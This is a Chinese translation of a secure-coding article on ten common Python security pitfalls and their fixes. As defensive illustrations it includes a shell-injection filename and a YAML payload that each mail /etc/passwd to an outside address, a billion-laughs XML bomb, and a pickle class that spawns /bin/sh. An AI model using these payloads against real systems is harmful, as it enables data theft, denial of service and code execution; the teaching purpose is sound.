# Python 中的 10 个常见安全陷阱以及如何避免它们

> 原文：<https://medium.com/hackernoon/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03>

![](img/96cd7896fea3439a4d980338edfa4078.png)

编写安全代码很难。当你学习一门语言、一个模块或一个框架时，你学习如何使用*。在考虑安全性时，您需要考虑如何滥用*。Python 也不例外，甚至在标准库中也有关于编写强化应用程序的不良实践。然而，当我与许多 Python 开发者交谈时，他们根本不知道这些。**

**以下是我的前 10 个*，排名不分先后*，Python 应用中常见的陷阱。**

# **1.输入注入**

**注入式攻击范围很广，非常普遍，而且有很多种类型。它们影响所有的语言、框架和环境。**

****SQL 注入**是您直接编写 SQL 查询的地方，而不是使用 ORM 和混合字符串与变量。我读过很多代码，其中“转义引号”被认为是一种修复。**不是。**通过这张备忘单让自己熟悉 SQL 注入可能发生的所有复杂情况。**

****命令注入**是指任何时候你使用 popen、subprocess、os.system 调用一个进程，并从变量中获取参数。当调用本地命令时，有人可能会恶意设置这些值。**

**想象一下这个简单的脚本[【信用】](https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html)。您使用用户提供的文件名调用子流程:**

```
**import subprocess

**def** **transcode_file**(request, filename):
    command **=** 'ffmpeg -i "{source}" output_file.mpg'**.**format(source**=**filename)
    subprocess**.**call(command, shell**=**True)  *# a bad idea!***
```

**攻击者将 filename 的值设置为`"; cat /etc/passwd | mail them@domain.com`或其他同样危险的值。**

## **修复:**

**使用 web 框架附带的实用程序(如果您正在使用的话)来清理输入。除非你有充分的理由，否则不要手工构造 SQL 查询。大多数 ORM 都有内置的杀毒方法。**

**对于外壳，使用`shlex`模块将[正确退出输入](https://docs.python.org/3/library/shlex.html#shlex.quote)。**

# **2.解析 XML**

**如果您的应用程序曾经加载和解析过 XML 文件，那么您很可能正在使用 XML 标准库模块之一。通过 XML 有一些常见的攻击。大部分是 DoS 风格的(旨在使系统崩溃，而不是泄漏数据)。这些攻击很常见，尤其是当你解析外部的 XML 文件时。**

**其中之一被称为“十亿次大笑”，因为有效载荷通常包含许多(数十亿次)“大笑”。基本上，这个想法是你可以在 XML 中引用实体，所以当你谦逊的 XML 解析器试图将这个 XML 文件加载到内存中时，它会消耗**千兆字节的内存。**不信你试试:-)**

```
**<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>**
```

**另一种攻击使用**外部实体扩展**。XML 支持从外部 URL 引用实体，XML 解析器通常会毫无顾虑地获取和加载该资源。攻击者可以绕过防火墙并获得对受限资源的访问权限，因为所有请求都是从内部可信的 IP 地址发出的，而不是从外部发出的**

**另一个要考虑的情况是你依赖的解码 XML 的第三方包，比如配置文件，远程 API。您甚至可能没有意识到，您的某个依赖项使自己暴露在这些类型的攻击之下。**

**那么 Python 中会发生什么呢？嗯，标准的库模块，etree、DOM、xmlrpc 都很容易受到这些类型的攻击。这是有据可查的[https://docs . python . org/3/library/XML . html # XML-vulnerabilities](https://docs.python.org/3/library/xml.html#xml-vulnerabilities)**

## **修复:**

**使用[defusexml](https://pypi.org/project/defusedxml/)作为标准库模块的直接替代。它增加了抵御这类攻击的安全措施。**

# **3.断言语句**

**不要使用断言语句来防止用户不应该访问的代码片段。举个简单的例子**

```
**def foo(request, user):
   assert user.is_admin, “user does not have access”
   # secure code...**
```

**现在，默认情况下 Python 以`__debug__`为真执行，但是在生产环境中，以优化方式运行是很常见的。这将**跳过断言**语句，直接进入安全代码，而不管用户`is_admin`是否。**

## **修复:**

**仅使用 assert 语句与其他开发人员通信，例如在单元测试或中，以防止不正确的 API 使用。**

# **4.定时攻击**

**计时攻击本质上是一种通过计时比较所提供的值需要多长时间来暴露行为和算法的方式。定时攻击需要精确性，因此它们通常不会在高延迟的远程网络上起作用。由于大多数 web 应用程序都有可变的延迟，所以编写一个针对 HTTP web 服务器的定时攻击几乎是不可能的。**

**但是，如果您有一个提示输入密码的命令行应用程序，攻击者可以编写一个简单的脚本来计算将密码值与实际密码进行比较所需的时间。[举例](http://jyx.github.io/blog/2014/02/02/timing-attack-proof-of-concept/)。**

**有一些令人印象深刻的例子，如[这个基于 SSH 的定时攻击](https://github.com/c0r3dump3d/osueta)是用 Python 写的，如果你想看看它们是如何工作的。**

## **修复:**

**使用 Python 3.5 中引入的`secrets.compare_digest`、比较密码和其他私有值。**

# **5.受污染的站点包或导入路径**

**Python 的导入系统非常灵活。当你试图为你的测试编写猴子补丁，或者重载核心功能时，这是非常好的。**

**但是，这是 Python 中最大的安全漏洞之一。**

**将第三方包安装到您的站点包中，无论是在虚拟环境中还是在全局站点包中(通常不鼓励这样做)，都会使您暴露于这些包中的安全漏洞。**

**已经出现了发布到 PyPi 的包，它们的名字与流行的包相似，但却是执行任意代码的[。最大的发生率，幸运的是没有伤害，只是“提出了一个观点”,这个问题并没有真正得到解决..](http://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/)**

**另一个要考虑的情况是你的依赖关系的依赖关系(等等)。它们可能包含漏洞，也可能通过导入系统覆盖 Python 中的默认行为。**

## **修复:**

**检查你的包裹。[看看 PyUp.io 和他们的安全服务](http://pyup.io/)。对所有应用程序使用虚拟环境，并确保您的全球站点包尽可能干净。检查包裹签名。**

# **6.临时文件**

**要在 Python 中创建临时文件，通常要使用`[mktemp()](https://docs.python.org/3/library/tempfile.html#tempfile.mktemp)`函数生成一个文件名，然后使用这个名称创建一个文件。这是不安全的，因为在第一个进程调用`[mktemp()](https://docs.python.org/3/library/tempfile.html#tempfile.mktemp)`和随后尝试创建文件之间，另一个进程**可能会创建一个同名文件**[【1】](https://docs.python.org/3/library/tempfile.html#deprecated-functions-and-variables)这意味着它可能会欺骗您的应用程序加载错误的数据或暴露其他临时数据。**

**如果您调用不正确的方法，Python 的最新版本将会发出运行时警告。**

## **修复:**

**使用`tempfile` [模块，如果需要生成临时文件，使用](https://docs.python.org/3/library/tempfile.html#tempfile.mkstemp) `mkstemp`。**

# **7.使用 yaml.load**

**引用 PyYAML 文档:**

> ****"警告:使用从不可信来源接收的任何数据调用** `**yaml.load**` **是不安全的！** `**yaml.load**` **和** `**pickle.load**` **一样强大，所以可以调用任何 Python 函数。”****

**这个漂亮的[例子是在流行的 Python 项目 Ansible 中找到的](https://www.talosintelligence.com/reports/TALOS-2017-0305)。您可以为 Ansible Vault 提供该值作为(有效)YAML。它用文件中提供的参数调用`os.system()`。**

```
**!!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]**
```

**因此，从用户提供的值有效地加载 YAML 文件会使您容易受到攻击。**

**Demo of this in action, credit Anthony Sottile**

## **修复:**

**使用`yaml.safe_load`，除非你有一个非常好的理由。**

# **8.泡菜**

**反序列化 pickle 数据和 YAML 一样糟糕。Python 类可以声明一个名为`__reduce__`的神奇方法，该方法返回一个字符串，或者一个元组，该元组具有可调用性和 pickling 时要调用的参数。攻击者可以利用它来引用其中一个子进程模块，从而在主机上运行任意命令。**

**这个精彩的例子展示了如何在 Python 2 中处理一个打开外壳的类。关于如何利用泡菜的例子还有很多。**

```
**import cPickle
import subprocess
import base64

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/sh',),))

print base64.b64encode(cPickle.dumps(RunBinSh()))**
```

## **修复:**

**永远不要从不受信任或未经验证的来源中提取数据。请使用另一种序列化模式，比如 JSON。**

# **9.使用系统 Python 运行时，而不是修补它**

**大多数 POSIX 系统都有 Python 2 版本。通常是旧的。**

**由于“Python”，即 CPython 是用 C 写的，所以有时候 Python 解释器本身就有漏洞。C #中常见的安全问题与内存分配有关，因此缓冲区溢出错误。**

**多年来，CPython 有许多溢出或溢出漏洞，每个漏洞都在后续版本中得到了修补和修复。**

**所以你是安全的。也就是说，如果你 ***给你的运行时*** 打补丁。**

**[下面是 2.7.13 及以下版本](https://www.cvedetails.com/cve/CVE-2017-1000158/)的一个例子，一个整数溢出漏洞，使代码执行。[这几乎是 Ubuntu 17 之前的任何未打补丁版本。](https://distrowatch.com/table.php?distribution=ubuntu)**

## **修复:**

**为您的生产应用程序安装最新版本的 Python，**并打补丁！****

# **10.不修补您的依赖项**

**类似于不给你的运行时打补丁，你也需要定期给你的依赖打补丁。**

**我发现将 PyPi 的 Python 包版本“钉”在包中的做法很可怕。想法是“*这些是工作的版本*”，所以每个人都不去管它。**

**我上面提到的代码中的所有漏洞，当它们存在于您的应用程序所使用的包中时，都是同样重要的。那些包的开发者修复安全问题。**一直**。**

## **修复:**

**使用 PyUp.io 这样的服务来检查更新，向您的应用程序发出拉/合并请求，并运行您的测试来保持包是最新的。**

**使用 InSpec 之类的工具[在生产](https://www.inspec.io/docs/reference/resources/pip/)环境中验证安装的版本，并确保修补最低版本或版本范围。**

# **你试过强盗吗？**

**有一个很棒的静态 linter 可以捕捉你代码中的所有这些问题，甚至更多！**

**叫土匪，就`pip install bandit`和`bandit ./codedir`**

**[](https://github.com/PyCQA/bandit) [## PyCQA/bandit

### bandit - Bandit 是一个用来发现 Python 代码中常见安全问题的工具。

github.com](https://github.com/PyCQA/bandit) 

> 我在一些研究中使用的这篇[伟大的文章](https://access.redhat.com/blogs/766093/posts/2592591)归功于 RedHat。**